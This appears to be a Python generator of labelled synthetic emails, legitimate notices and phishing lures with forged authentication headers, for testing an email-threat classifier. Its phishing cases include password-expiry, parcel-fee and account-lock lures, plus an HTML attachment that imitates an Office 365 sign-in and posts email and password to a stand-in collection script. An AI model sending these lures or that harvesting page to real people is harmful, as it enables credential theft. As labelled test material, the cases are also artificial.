from __future__ import annotations

import io
import pathlib
import zipfile
from datetime import datetime, timedelta, timezone
from email import encoders, policy
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import format_datetime

HERE = pathlib.Path(__file__).resolve().parent
SAMPLES = HERE.parent.parent / "samples"
IST = timezone(timedelta(hours=5, minutes=30))
BASE = datetime(2026, 9, 10, 9, 30, tzinfo=IST)

RELAYS = {
    "gmail": ("mail-sor-f41.google.com", "209.85.220.41"),
    "gmail2": ("mail-sor-f69.google.com", "209.85.220.69"),
    "yahoo": ("sonic306-21.consmr.mail.ne1.yahoo.com", "66.163.189.83"),
    "outlook": ("mail-eopbgr1300046.outbound.protection.outlook.com", "40.107.130.46"),
    "proton": ("mail-4322.protonmail.ch", "185.70.43.22"),
    "yandex": ("forward100a.mail.yandex.net", "178.154.239.72"),
    "github": ("out-27.smtp.github.com", "192.30.252.206"),
    "ses": ("a27-15.smtp-out.us-west-2.amazonses.com", "54.240.27.15"),
    "sendgrid": ("o1.ptr2345.hackculture.net", "168.245.19.44"),
    "mailchimp": ("mail191.atl101.mcsv.net", "198.2.128.191"),
    "bulk": ("relay-eu2.bulkmail-hub.icu", "193.42.33.118"),
    "vps": ("vps-2291.hostwave.cloud", "185.220.101.45"),
    "unknown": ("unknown", "91.215.85.140"),
}


def pdf_bytes(text: str = "Statement") -> bytes:
    body = f"BT /F1 12 Tf 72 720 Td ({text}) Tj ET".encode()
    return (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
        b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj\n"
        b"4 0 obj<</Length " + str(len(body)).encode() + b">>stream\n" + body + b"\nendstream endobj\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    )


def docx_bytes(text: str = "Proposal") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
        )
        zf.writestr("_rels/.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>')
        zf.writestr(
            "word/document.xml",
            '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            f"<w:body><w:p><w:r><w:t>{text}</w:t></w:r></w:p></w:body></w:document>",
        )
    return buf.getvalue()


def zip_bytes(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


def exe_bytes() -> bytes:
    return b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"\x00" * 48 + b"PE\x00\x00" + bytes(range(256)) * 8


def png_bytes() -> bytes:
    return b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10\x00\x00\x00\x10\x08\x02\x00\x00\x00\x90\x91h6" + bytes(range(256)) * 3


ICS = """BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Zoom//Zoom Calendar//EN
BEGIN:VEVENT
UID:9f2a4c1e-zoom@acme-corp.in
DTSTART:20260912T053000Z
DTEND:20260912T063000Z
SUMMARY:Sprint review
LOCATION:https://us02web.zoom.us/j/84512339021?pwd=Q2tGb3Zq
END:VEVENT
END:VCALENDAR
"""

LOGIN_HTML = """<html><head><title>Secure Document</title><script>function go(){document.f.submit();}</script></head>
<body><h2>Microsoft Office 365</h2><p>Sign in to view the secure document.</p>
<form name="f" method="post" action="https://docs-online-secure.com/collect.php">
<input name="email" placeholder="Email"><input name="password" type="password" placeholder="Password">
<button onclick="go()">View document</button></form></body></html>"""


def _fmt(dt: datetime) -> str:
    return format_datetime(dt)


def build(
    *,
    frm: str,
    to: str = "rohan.pandey@acme-corp.in",
    subject: str,
    text: str | None = None,
    html: str | None = None,
    reply_to: str | None = None,
    return_path: str | None = None,
    spf: str = "pass",
    dkim: str = "pass",
    dkim_domain: str | None = None,
    dmarc: str = "pass",
    dmarc_policy: str = "NONE",
    relay: str = "gmail",
    client_ip: str | None = None,
    client_host: str = "[192.168.1.7]",
    msgid_domain: str | None = None,
    mailer: str | None = None,
    attachments: list[tuple[str, bytes, str]] | None = None,
    extra_headers: dict[str, str] | None = None,
    no_auth_results: bool = False,
    tls: bool = True,
    minutes: int = 0,
) -> bytes:
    address = frm.split("<")[-1].strip(">").strip() if "<" in frm else frm.strip()
    from_domain = address.rsplit("@", 1)[-1]
    return_path = return_path or address
    dkim_domain = dkim_domain or from_domain
    relay_host, relay_ip = RELAYS[relay]
    outer = BASE + timedelta(minutes=minutes)
    inner = outer - timedelta(seconds=95)

    if attachments or (text and html):
        if attachments:
            root = MIMEMultipart("mixed")
            if text and html:
                alt = MIMEMultipart("alternative")
                alt.attach(MIMEText(text, "plain", "utf-8"))
                alt.attach(MIMEText(html, "html", "utf-8"))
                root.attach(alt)
            elif html:
                root.attach(MIMEText(html, "html", "utf-8"))
            else:
                root.attach(MIMEText(text or "", "plain", "utf-8"))
            for name, data, ctype in attachments:
                main, sub = ctype.split("/", 1)
                if main == "text":
                    part = MIMEText(data.decode("utf-8", "replace"), sub, "utf-8")
                    part.add_header("Content-Disposition", "attachment", filename=name)
                elif main == "application":
                    part = MIMEApplication(data, sub, name=name)
                    part.add_header("Content-Disposition", "attachment", filename=name)
                else:
                    part = MIMEBase(main, sub)
                    part.set_payload(data)
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition", "attachment", filename=name)
                root.attach(part)
        else:
            root = MIMEMultipart("alternative")
            root.attach(MIMEText(text or "", "plain", "utf-8"))
            root.attach(MIMEText(html or "", "html", "utf-8"))
    elif html:
        root = MIMEText(html, "html", "utf-8")
    else:
        root = MIMEText(text or "", "plain", "utf-8")

    root["From"] = frm
    root["To"] = to
    root["Subject"] = subject
    root["Date"] = _fmt(inner - timedelta(seconds=20))
    root["Message-ID"] = f"<{abs(hash(subject + address)) % 10**12:012d}.{outer.timestamp():.0f}@{msgid_domain or from_domain}>"
    if reply_to:
        root["Reply-To"] = reply_to
    if mailer:
        root["X-Mailer"] = mailer
    for key, value in (extra_headers or {}).items():
        root[key] = value
    root["MIME-Version"] = "1.0"

    proto = "ESMTPS" if tls else "ESMTP"
    tls_line = "        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);\r\n" if tls else ""
    lines = [
        f"Delivered-To: {to}",
        f"Received: by 2002:a05:6a00:3d0c:b0:72a:9e1f:4b73 with SMTP id d2e1a72fcca58-{abs(hash(subject)) % 10**9:09d}csp;",
        f"        {_fmt(outer + timedelta(seconds=2))}",
        f"Return-Path: <{return_path}>",
        f"Received: from {relay_host} ({relay_host}. [{relay_ip}])",
        f"        by mx.google.com with {proto} id d9443c01a7336-{abs(hash(address)) % 10**9:09d}si",
        f"        for <{to}>",
        f"{tls_line}        {_fmt(outer)}" if tls else f"        for <{to}>;\r\n        {_fmt(outer)}",
    ]
    if not tls:
        lines[-2] = f"        for <{to}>;"
        lines[-1] = f"        {_fmt(outer)}"
    if not no_auth_results:
        lines.append(
            f"Received-SPF: {spf} (google.com: domain of {return_path} "
            f"{'designates' if spf == 'pass' else 'does not designate'} {relay_ip} as permitted sender) client-ip={relay_ip};"
        )
        dkim_part = (
            f"dkim={dkim} header.i=@{dkim_domain} header.d={dkim_domain} header.s=s2048 header.b=Qm9nd3Vz;"
            if dkim != "none"
            else "dkim=none;"
        )
        lines.append(
            "Authentication-Results: mx.google.com;\r\n"
            f"       spf={spf} (google.com: domain of {return_path} "
            f"{'designates' if spf == 'pass' else 'does not designate'} {relay_ip} as permitted sender) smtp.mailfrom={return_path};\r\n"
            f"       {dkim_part}\r\n"
            f"       dmarc={dmarc} (p={dmarc_policy} sp={dmarc_policy} dis=NONE) header.from={from_domain}"
        )
    if client_ip:
        lines.append(
            f"Received: from {client_host} ([{client_ip}])\r\n"
            f"        by {relay_host.split('.', 1)[-1] if relay == 'gmail' else relay_host} with ESMTPSA id k7sm{abs(hash(client_ip)) % 10**7:07d}\r\n"
            f"        for <{to}>\r\n"
            f"        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);\r\n"
            f"        {_fmt(inner)}"
        )
    trace = "\r\n".join(lines) + "\r\n"
    body = root.as_bytes(policy=policy.SMTP)
    return trace.encode("utf-8") + body


CASES: list[dict] = []


def case(name: str, expect: str, ok: set[str] | None = None, **kw) -> None:
    CASES.append({"name": name, "expect": expect, "ok": sorted(ok or {expect}), "kw": kw})


LEGIT = "Legitimate"
SUSP = "Suspicious"
IMP = "Impersonated"
PHISH = "Phishing"
FRAUD = "Fraud-Related"
THREAT = "Threat"

case(
    "L02_amazon_order", LEGIT,
    frm='"Amazon.in" <auto-confirm@amazon.in>', return_path="202609100930abc@bounces.amazon.in", relay="ses",
    dkim_domain="amazon.in", dmarc_policy="QUARANTINE",
    subject="Your Amazon.in order #403-7712045-2210938 of 'boAt Rockerz 450' has been placed",
    text="""Hello Rohan Pandey,

Thank you for shopping with us. Your order will be delivered by Saturday, 13 September.

Order details
Order #403-7712045-2210938
boAt Rockerz 450 Bluetooth On Ear Headphones (Luscious Black)
Qty: 1
Order total: Rs.1,299.00
Payment method: UPI

Track your package: https://www.amazon.in/gp/your-account/order-details?orderID=403-7712045-2210938

You can manage your orders, returns and payment options at https://www.amazon.in/your-account

Thank you for shopping with Amazon.in.

This email was sent from a notification-only address that cannot accept incoming email. Please do not reply to this message.
""",
)

case(
    "L03_password_reset_github", LEGIT,
    frm="GitHub <noreply@github.com>", relay="github", dmarc_policy="REJECT",
    subject="[GitHub] Please reset your password",
    text="""We heard that you lost your GitHub password. Sorry about that!

But don't worry! You can use the following link to reset your password:

https://github.com/password_reset/7f3c1a9e2b4d5f60718293a4b5c6d7e8

If you don't use this link within 3 hours, it will expire. To get a new password reset link, visit:
https://github.com/password_reset

If you did not request a password reset, you can safely ignore this email. Your password will not change.

Thanks,
The GitHub Team
""",
)

case(
    "L04_google_security_alert", LEGIT,
    frm="Google <no-reply@accounts.google.com>", return_path="3AbCdEfGhIjKl@accounts.google.com",
    relay="gmail2", dkim_domain="accounts.google.com", dmarc_policy="REJECT",
    subject="Security alert",
    text="""New sign-in on Windows

rohan.pandey.dev@gmail.com

We noticed a new sign-in to your Google Account on a Windows device. If this was you, you don't need to do anything. If not, we'll help you secure your account.

Check activity
https://accounts.google.com/AccountChooser?Email=rohan.pandey.dev@gmail.com&continue=https://myaccount.google.com/alert/nt/1757493000000

You can also see security activity at
https://myaccount.google.com/notifications

You received this email to let you know about important changes to your Google Account and services.
Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
""",
)

case(
    "L05_hdfc_statement", LEGIT,
    frm='"HDFC Bank" <alerts@hdfcbank.net>', return_path="alerts@hdfcbank.net", relay="ses",
    dkim_domain="hdfcbank.net", dmarc_policy="REJECT",
    subject="Your HDFC Bank account statement for August 2026",
    text="""Dear Customer,

Your HDFC Bank savings account statement for the period 01-Aug-2026 to 31-Aug-2026 is attached.

The PDF is password protected. The password is your Customer ID followed by your date of birth in DDMM format.

For any queries please call PhoneBanking on 1800 1600 or visit your nearest branch.

Please do not reply to this email. This is a system generated statement.

Regards,
HDFC Bank
""",
    attachments=[("Statement_Aug2026.pdf", pdf_bytes("HDFC Bank statement"), "application/pdf")],
)

case(
    "L06_sbi_otp", LEGIT,
    frm='"SBI" <alerts@sbi.co.in>', return_path="alerts@sbi.co.in", relay="ses", dkim_domain="sbi.co.in",
    dmarc_policy="REJECT",
    subject="OTP for your SBI internet banking login",
    text="""Dear Customer,

482913 is the OTP for your State Bank internet banking login. It is valid for 10 minutes.

Please do not share this OTP with anyone. SBI never asks for your OTP, PIN, password or card details over phone, SMS or email.

If you did not initiate this login, please call 1800 1234 (toll free) immediately.

State Bank of India
""",
)

case(
    "L07_vendor_invoice_genuine", LEGIT, {LEGIT, SUSP},
    frm='"Bluepeak Solutions Accounts" <accounts@bluepeak-solutions.com>', relay="outlook",
    subject="Invoice INV-2026-0912 for August consulting services",
    text="""Dear Priya,

Please find attached invoice INV-2026-0912 for the consulting services delivered in August 2026 under PO 4471.

Amount: Rs.2,36,000 (inclusive of GST)
Payment due: within 30 days of invoice date, as per our contract.

Our bank details are unchanged and are printed on the invoice. Kindly share the UTR once the payment is processed so we can reconcile it.

Thanks and regards,
Meera Iyer
Accounts, Bluepeak Solutions Pvt Ltd
+91 80 4123 4567
""",
    attachments=[("INV-2026-0912.pdf", pdf_bytes("Invoice"), "application/pdf")],
)

case(
    "L08_friend_upi", LEGIT,
    frm='"Aditya Sharma" <aditya.sharma.0412@gmail.com>', client_ip="49.36.220.14", client_host="smtpclient.apple",
    subject="saturday plan",
    text="""bro are we still on for saturday? i booked the tickets, send me 500 for yours whenever, my upi is aditya0412@ybl

also bring the type-c charger you borrowed lol

- adi
""",
)

case(
    "L09_professor_assignment", LEGIT,
    frm='"Vishal Gupta" <vishal_gupta@liet.in>', relay="gmail", dkim_domain="liet.in", client_ip="103.87.140.22",
    to="cse-2026@liet.in",
    subject="Assignment 2 - submission deadline tomorrow 5 PM",
    text="""Dear students,

This is a reminder that Assignment 2 (Python file handling) is due tomorrow, 11 September, by 5 PM on the LMS:
https://lms.liet.in/course/view.php?id=214

Late submissions will attract a penalty of 2 marks per day as per the course policy. The question paper is attached again for reference.

Regards,
Vishal Gupta
Assistant Professor, CSE
""",
    attachments=[("Assignment2.pdf", pdf_bytes("Assignment 2"), "application/pdf")],
)

case(
    "L10_swiggy_marketing", LEGIT,
    frm='"Swiggy" <noreply@swiggy.in>', return_path="bounce+9f2a@swiggy.in", relay="ses", dkim_domain="swiggy.in",
    subject="Flat 50% OFF on your next 3 orders - today only!",
    html="""<html><body style="font-family:Arial">
<h1>Craving something? Flat 50% OFF is here.</h1>
<p>Rohan, use code <b>HUNGRY50</b> on your next 3 orders. Limited time offer, valid till midnight today.</p>
<p><a href="https://www.swiggy.com/restaurants?utm_source=email&utm_campaign=hungry50">Order now</a></p>
<p>Hurry, offers this good don't last!</p>
<p style="font-size:11px;color:#888">You are receiving this because you signed up on Swiggy. <a href="https://www.swiggy.com/unsubscribe?u=9f2a">Unsubscribe</a><br>
Bundl Technologies Pvt Ltd, Bengaluru 560103</p></body></html>""",
    extra_headers={"List-Unsubscribe": "<https://www.swiggy.com/unsubscribe?u=9f2a>", "Precedence": "bulk"},
)

case(
    "L11_hr_bank_details_internal", LEGIT,
    frm='"Acme HR" <hr@acme-corp.in>', relay="gmail", dkim_domain="acme-corp.in", to="all-staff@acme-corp.in",
    subject="Action needed: update your salary account details on the HR portal by 30 September",
    text="""Dear colleagues,

As part of the payroll migration to the new bank, please update your salary bank account details (account number, IFSC, bank name) on the HR portal by 30 September:

https://hr.acme-corp.in/self-service/bank-details

Payments for the October cycle will be made only to the account recorded on the portal. If you have already updated your details this month, no action is needed.

For help, contact hr@acme-corp.in or extension 2201.

Regards,
People Operations, Acme Corp
""",
)

case(
    "L12_linkedin_notification", LEGIT,
    frm='"LinkedIn" <messages-noreply@linkedin.com>', return_path="s-1a2b3c@bounce.linkedin.com", relay="ses",
    dkim_domain="linkedin.com", dmarc_policy="REJECT",
    subject="Rohan, you have 2 new messages",
    html="""<html><body><p>Hi Rohan,</p><p>You have 2 unread messages.</p>
<p><b>Neha Kapoor</b>: Hi Rohan, thanks for connecting. Are you open to a chat about our SOC analyst role?</p>
<p><a href="https://www.linkedin.com/comm/messaging/thread/2-MTc1Nzk5?midToken=AQH7&trk=eml-email_new_message">View messages</a></p>
<p style="font-size:10px">This email was intended for Rohan Pandey. <a href="https://www.linkedin.com/comm/psettings/email-unsubscribe?lipi=urn">Unsubscribe</a>. LinkedIn Corporation, 1000 W Maude Ave, Sunnyvale, CA 94085.</p></body></html>""",
    extra_headers={"List-Unsubscribe": "<https://www.linkedin.com/comm/psettings/email-unsubscribe?lipi=urn>"},
)

case(
    "L13_zoom_invite_ics", LEGIT,
    frm='"Priya Nair" <priya.nair@acme-corp.in>', relay="gmail", dkim_domain="acme-corp.in",
    subject="Invitation: Sprint review @ Fri 12 Sep 11:00 (IST)",
    text="""Priya Nair is inviting you to a scheduled Zoom meeting.

Topic: Sprint review
Time: Sep 12, 2026 11:00 AM India

Join Zoom Meeting
https://us02web.zoom.us/j/84512339021?pwd=Q2tGb3Zq

Meeting ID: 845 1233 9021
Passcode: 774411
""",
    attachments=[("invite.ics", ICS.encode(), "text/calendar")],
)

case(
    "L14_it_password_expiry_internal", LEGIT,
    frm='"Acme IT Helpdesk" <it-helpdesk@acme-corp.in>', relay="gmail", dkim_domain="acme-corp.in",
    subject="Your Acme network password expires in 3 days",
    text="""Hi Rohan,

Your Acme network password will expire in 3 days (on 13 September). Please change it before then to avoid being locked out of email and VPN.

Change it at https://password.acme-corp.in (VPN or office network required), or press Ctrl+Alt+Del on a domain-joined laptop and choose "Change a password".

Reminder: IT will never ask for your password by email or phone.

Thanks,
IT Helpdesk, Acme Corp
ext. 1100
""",
)

case(
    "L15_indigo_eticket", LEGIT,
    frm='"IndiGo" <no-reply@goindigo.in>', return_path="no-reply@goindigo.in", relay="ses", dkim_domain="goindigo.in",
    subject="IndiGo Itinerary - PNR X7K2LM - DEL to BLR - 20 Sep 2026",
    text="""Dear Rohan Pandey,

Your booking is confirmed.

PNR: X7K2LM
Flight: 6E 2134, Delhi (DEL) 06:10 - Bengaluru (BLR) 08:55, Saturday 20 Sep 2026
Passenger: Rohan Pandey
Fare: Rs.5,438 (payment received via UPI)

Web check-in opens 48 hours before departure: https://www.goindigo.in/web-check-in.html
Carry a valid photo ID. Please reach the airport at least 2 hours before departure.

Manage your booking: https://www.goindigo.in/view-booking.html

IndiGo (InterGlobe Aviation Ltd)
""",
)

DSN_TEXT = """The original message was received at Wed, 10 Sep 2026 09:28:35 +0530

   ----- The following addresses had permanent fatal errors -----
<accounts@bluepeak-solution.com>
    (reason: 550 5.1.1 The email account that you tried to reach does not exist.)

Your message wasn't delivered to accounts@bluepeak-solution.com because the address couldn't be found, or is unable to receive mail.
"""
case(
    "L16_bounce_dsn", LEGIT,
    frm='"Mail Delivery Subsystem" <mailer-daemon@googlemail.com>', return_path="", relay="gmail",
    dkim_domain="googlemail.com", spf="pass", dmarc="pass",
    subject="Delivery Status Notification (Failure)",
    text=DSN_TEXT,
    attachments=[
        ("details.txt", b"Reporting-MTA: dns; googlemail.com\nFinal-Recipient: rfc822; accounts@bluepeak-solution.com\nAction: failed\nStatus: 5.1.1\n", "text/plain"),
        ("original.eml", b"From: rohan.pandey@acme-corp.in\r\nTo: accounts@bluepeak-solution.com\r\nSubject: Re: Invoice INV-2026-0912\r\n\r\nThanks, processed today. UTR shared separately.\r\n", "message/rfc822"),
    ],
    extra_headers={"Auto-Submitted": "auto-replied"},
)

case(
    "L17_short_reply", LEGIT,
    frm='"Karan Mehta" <karan.mehta@acme-corp.in>', relay="gmail", dkim_domain="acme-corp.in",
    subject="Re: deployment window",
    text="Ok thanks, will do.\n\nOn Wed, 10 Sep 2026 at 09:12, Rohan Pandey <rohan.pandey@acme-corp.in> wrote:\n> Can you take the 4 PM slot?\n",
)

case(
    "L18_hindi_meeting", LEGIT,
    frm='"Neha Verma" <neha.verma91@gmail.com>',
    subject="कल की मीटिंग",
    text="नमस्ते रोहन,\n\nकल की मीटिंग सुबह 10 बजे है। कृपया प्रोजेक्ट रिपोर्ट साथ लाएँ। अगर कोई दिक्कत हो तो बताना।\n\nधन्यवाद,\nनेहा\n",
)

case(
    "L19_out_of_office", LEGIT,
    frm='"Meera Iyer" <meera.iyer@bluepeak-solutions.com>', relay="outlook",
    subject="Automatic reply: Invoice INV-2026-0912 for August consulting services",
    text="""I am out of office until 20 September with limited access to email.

For urgent matters please contact my colleague Arjun at arjun.rao@bluepeak-solutions.com or call the office on +91 80 4123 4567.

Regards,
Meera Iyer
""",
    extra_headers={"Auto-Submitted": "auto-replied", "X-Auto-Response-Suppress": "All"},
)

case(
    "L20_colleague_docx", LEGIT,
    frm='"Karan Mehta" <karan.mehta@acme-corp.in>', relay="gmail", dkim_domain="acme-corp.in",
    subject="Q4 proposal draft",
    text="Hi Rohan,\n\nPlease review the attached proposal before Thursday's call and add your comments on the security section.\n\nThanks,\nKaran\n",
    attachments=[("Q4_Proposal_v2.docx", docx_bytes("Q4 proposal"), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")],
)

case(
    "L21_flipkart_refund", LEGIT,
    frm='"Flipkart" <noreply@flipkart.com>', return_path="bounce@nct.flipkart.com", relay="ses", dkim_domain="flipkart.com",
    subject="Refund of Rs.499 for order OD331207754112 has been processed",
    text="""Hi Rohan,

Good news! Your refund of Rs.499.00 for order OD331207754112 (Noise ColorFit strap) has been processed and credited to your original payment method (UPI).

It may take 5-7 business days to reflect in your account depending on your bank.

Track refund: https://www.flipkart.com/account/orders?order_id=OD331207754112

Thanks for shopping with Flipkart.
""",
)

case(
    "L22_interview_call", LEGIT,
    frm='"Zentrix Labs Talent Team" <talent@zentrixlabs.com>', relay="gmail", dkim_domain="zentrixlabs.com",
    client_ip="103.21.58.9",
    subject="Interview invitation - Software Engineer (Security) - Zentrix Labs",
    text="""Dear Rohan,

Congratulations! You have been shortlisted for the Software Engineer (Security) interview at Zentrix Labs.

Date: Thursday, 18 September 2026, 11:00 AM IST
Mode: Google Meet - https://meet.google.com/abc-defg-hij
Panel: Anjali Rao (Engineering Manager), Vikram Sethi (Security Lead)

Please confirm your availability by replying to this email. Keep a government photo ID handy for verification at the start of the call.

Best regards,
Sneha Kulkarni
Talent Acquisition, Zentrix Labs
""",
)

case(
    "L23_google_groups_digest", LEGIT,
    frm='"cse-2026" <cse-2026@googlegroups.com>', return_path="cse-2026+bncBDO@googlegroups.com", relay="gmail2",
    dkim_domain="googlegroups.com",
    subject="[cse-2026] Digest for cse-2026@googlegroups.com - 3 updates in 2 topics",
    text="""Today's topic summary

Group: https://groups.google.com/g/cse-2026/topics

- Placement drive schedule [2 updates] https://groups.google.com/g/cse-2026/c/9x2ab
- Notes for OS unit 3 [1 update] https://groups.google.com/g/cse-2026/c/7ff1c

You received this digest because you're subscribed to updates for this group. To unsubscribe, send an email to cse-2026+unsubscribe@googlegroups.com.
""",
    extra_headers={"List-Id": "<cse-2026.googlegroups.com>", "Precedence": "list"},
)

case(
    "L24_airtel_bill", LEGIT,
    frm='"Airtel" <airtel@airtel.in>', return_path="bounces@airtel.in", relay="ses", dkim_domain="airtel.in",
    subject="Your Airtel postpaid bill of Rs.1,240 is due on 20 Sep",
    html="""<html><body><p>Hi Rohan,</p>
<p>Your Airtel postpaid bill for 98100xxxxx is ready.</p>
<p>Bill amount: <b>Rs.1,240.00</b><br>Due date: <b>20 Sep 2026</b></p>
<p><a href="https://www.airtel.in/s/selfcare?bill=pay">Pay now</a> to avoid late payment charges.</p>
<p>You can also pay through the Airtel Thanks app.</p>
<p style="font-size:10px">Bharti Airtel Limited, New Delhi. <a href="https://www.airtel.in/unsubscribe">Unsubscribe</a></p></body></html>""",
)

case(
    "L25_bluedart_delivery", LEGIT,
    frm='"Blue Dart" <noreply@bluedart.com>', relay="ses", dkim_domain="bluedart.com",
    subject="Your shipment 79512204137 is out for delivery",
    text="""Dear Customer,

Your Blue Dart shipment with AWB 79512204137 from Amazon Seller Services is out for delivery today and is expected between 10 AM and 6 PM.

Track: https://www.bluedart.com/tracking?awb=79512204137

Please keep the OTP sent to your registered mobile number ready to share with the delivery associate.

Blue Dart Express Limited
""",
)

case(
    "L26_mailchimp_newsletter", LEGIT,
    frm='"PyCon India" <news@in.pycon.org>', return_path="bounce-mc.us21_123456.789-rohan=acme-corp.in@mail191.atl101.mcsv.net",
    relay="mailchimp", dkim_domain="mail191.atl101.mcsv.net",
    subject="PyCon India 2026: schedule is live, early bird ends Friday",
    html="""<html><body><p><a href="https://mailchi.mp/in.pycon.org/schedule-live?e=9f2a1b">View this email in your browser</a></p>
<h2>The schedule is live!</h2><p>Three tracks, 48 talks, 6 workshops. Browse it here:
<a href="https://in.pycon.org/2026/schedule/?utm_source=mc&utm_medium=email">in.pycon.org/2026/schedule</a></p>
<p>Early bird tickets end this Friday. <a href="https://pycon.us21.list-manage.com/track/click?u=9f2a1b&id=77ab12&e=9f2a1b">Get your ticket</a>.</p>
<p style="font-size:10px">You are receiving this because you attended PyCon India before.
<a href="https://pycon.us21.list-manage.com/unsubscribe?u=9f2a1b&id=77ab12&e=9f2a1b">unsubscribe</a> | <a href="https://pycon.us21.list-manage.com/profile?u=9f2a1b&id=77ab12&e=9f2a1b">update preferences</a></p></body></html>""",
    extra_headers={"List-Unsubscribe": "<https://pycon.us21.list-manage.com/unsubscribe?u=9f2a1b&id=77ab12&e=9f2a1b>", "X-Mailer": "MailChimp Mailer - **CID9f2a1b**"},
)

case(
    "P02_m365_password_expiry", PHISH,
    frm='"Microsoft 365 Admin" <admin@office365-mailsupport.com>', relay="bulk", spf="none", dkim="none", dmarc="none",
    tls=False, msgid_domain="office365-mailsupport.com",
    subject="Password expiration notice for rohan.pandey@acme-corp.in",
    html="""<html><body><p>Dear rohan.pandey,</p>
<p>Your Office 365 password will expire in <b>24 hours</b>. To keep your current password and avoid interruption of email service, click the button below.</p>
<p><a href="http://microsoft365-verify-login.top/owa/auth.php?email=rohan.pandey@acme-corp.in">Keep Same Password</a></p>
<p>If you do not update your password your account will be disabled.</p>
<p>Microsoft 365 Admin Team</p></body></html>""",
)

case(
    "P03_dhl_customs_fee", PHISH,
    frm='"DHL Express" <dhl.delivery.notice2026@gmail.com>', client_ip="197.210.85.12", client_host="DESKTOP-K8J2M1",
    subject="Your parcel is on hold - customs fee pending",
    text="""Dear customer,

Your DHL parcel (tracking 7812 3345 9021) could not be delivered because a customs duty of Rs.49 is unpaid.

Pay the fee within 24 hours to schedule redelivery:
https://dhl-parcel-redelivery.info/track/7812334590211/pay

If the fee is not paid the parcel will be returned to the sender.

DHL Express Customer Service
""",
)

case(
    "P04_netflix_billing", PHISH,
    frm='"Netflix" <info@netflix-billing-center.com>', relay="vps", spf="none", dkim="none", dmarc="none",
    msgid_domain="netflix-billing-center.com",
    subject="Your membership has been suspended - update your payment details",
    html="""<html><body><p>Hi,</p><p>We were unable to validate your billing information for the next billing cycle of your subscription, therefore we have suspended your membership.</p>
<p>Update your payment details within 48 hours to keep watching:</p>
<p><a href="http://netflix-account-update.xyz/login?id=7f3c">Update payment method</a></p>
<p>Netflix</p></body></html>""",
)

case(
    "P05_apple_id_locked", PHISH,
    frm='"Apple" <no-reply@appleid-support-center.com>', relay="vps", spf="softfail", dkim="none", dmarc="fail",
    msgid_domain="appleid-support-center.com",
    subject="Your Apple ID has been locked for security reasons",
    text="""Dear Customer,

Your Apple ID (rohan.pandey@acme-corp.in) has been locked because someone tried to sign in from an unknown device.

To unlock your account, verify your identity within 24 hours:
https://appleid-verify.support/unlock?ref=A1F9

If you don't verify, your account will be permanently disabled.

Apple Support
""",
)

case(
    "P06_html_attachment_login", PHISH,
    frm='"SharePoint Online" <share@docs-online-secure.com>', relay="vps", spf="none", dkim="none", dmarc="none",
    msgid_domain="docs-online-secure.com",
    subject="Priya Nair shared 'Invoice_Sept2026' with you",
    text="Priya Nair has shared a secure document with you.\n\nOpen the attached file to view the document. You will be asked to sign in with your email account.\n",
    attachments=[("SecureDoc_Invoice.html", LOGIN_HTML.encode(), "text/html")],
)

case(
    "P07_org_lookalike_helpdesk", PHISH, {PHISH, IMP},
    frm='"Acme IT Helpdesk" <helpdesk@acme-corp-in.net>', relay="vps", spf="none", dkim="none", dmarc="none",
    msgid_domain="acme-corp-in.net",
    subject="Mailbox storage full - action required",
    text="""Your mailbox has exceeded its storage quota (98%). Incoming messages will bounce unless you upgrade within 24 hours.

Upgrade your mailbox: http://acme-corp-mailbox-upgrade.com/login?user=rohan.pandey@acme-corp.in

IT Helpdesk
Acme Corp
""",
)

case(
    "P08_instagram_copyright", PHISH,
    frm='"Instagram Support" <support@instagram-copyright-appeal.com>', relay="vps", spf="pass", dkim="pass", dmarc="pass",
    msgid_domain="instagram-copyright-appeal.com",
    subject="Copyright infringement notice - your account will be deleted in 24 hours",
    text="""Hello rohan.pandey,

We received a copyright complaint about content posted on your Instagram account. If you believe this is a mistake, you must submit an appeal within 24 hours or your account will be permanently deleted.

Submit appeal: https://instagram-copyright-appeal.com/appeal/login

Instagram Support Team
""",
)

case(
    "P09_google_docs_share", PHISH,
    frm='"Google Docs" <drive.shares.noreply.2026@gmail.com>', client_ip="41.203.72.15", client_host="[41.203.72.15]",
    subject="Document shared with you: 'Payment_Advice_Sept.docx'",
    text="""Karan Mehta (karan.mehta@acme-corp.in) has shared a document with you.

Open in Docs: http://docs-google-share.online/document/d/1aB2cD3eF4/view?usp=sharing

Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043
""",
)

case(
    "P10_bitly_verify", PHISH,
    frm='"Account Security" <security-alert.desk@protonmail.com>', relay="proton", dkim_domain="protonmail.com",
    subject="Unusual sign-in activity detected",
    text="""We detected unusual sign-in activity on your account from a new location.

Verify your account now to avoid suspension: https://bit.ly/3xYzAbQ

If you don't verify within 12 hours your account will be locked.

Security Team
""",
